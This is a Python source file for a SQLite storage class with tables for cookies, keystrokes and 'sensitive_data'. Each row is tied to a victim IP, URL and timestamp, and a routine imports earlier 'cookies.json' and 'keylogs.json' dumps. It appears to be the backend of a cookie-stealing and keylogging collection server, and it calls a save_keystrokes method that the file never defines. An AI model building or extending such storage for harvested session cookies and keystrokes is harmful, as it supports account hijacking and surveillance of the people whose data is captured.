import sqlite3
from datetime import datetime, timedelta
import json
from pathlib import Path

class Database:
    def __init__(self):
        self.db_path = Path("data.db")
        self.init_db()

    def init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.executescript('''
                CREATE TABLE IF NOT EXISTS cookies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT,
                    value TEXT,
                    ip TEXT,
                    timestamp DATETIME,
                    domain TEXT
                );

                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    keys TEXT,
                    url TEXT,
                    ip TEXT,
                    timestamp DATETIME
                );

                CREATE TABLE IF NOT EXISTS sensitive_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    type TEXT,
                    value TEXT,
                    url TEXT,
                    ip TEXT,
                    timestamp DATETIME
                );
            ''')

    def migrate_json_to_db(self):
        # Migrate existing JSON data to SQLite
        try:
            with open('cookies.json', 'r') as f:
                cookies = json.load(f)
                for cookie in cookies:
                    self.save_cookie(
                        cookie['name'],
                        cookie['value'],
                        cookie['ip'],
                        cookie.get('domain', '')
                    )
            
            with open('keylogs.json', 'r') as f:
                logs = json.load(f)
                for log in logs:
                    self.save_keystrokes(
                        log['keys'],
                        log['url'],
                        log['ip']
                    )
        except FileNotFoundError:
            pass

    def save_cookie(self, name, value, ip, domain=''):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('''
                INSERT INTO cookies (name, value, ip, timestamp, domain)
                VALUES (?, ?, ?, ?, ?)
            ''', (name, value, ip, datetime.now(), domain))

    def get_cookies(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM cookies ORDER BY timestamp DESC')
            return c.fetchall()

    def clear_cookies(self):
        with sqlite3.connect(self.db_path) as conn:
            c = conn.cursor()
            c.execute('DELETE FROM cookies')
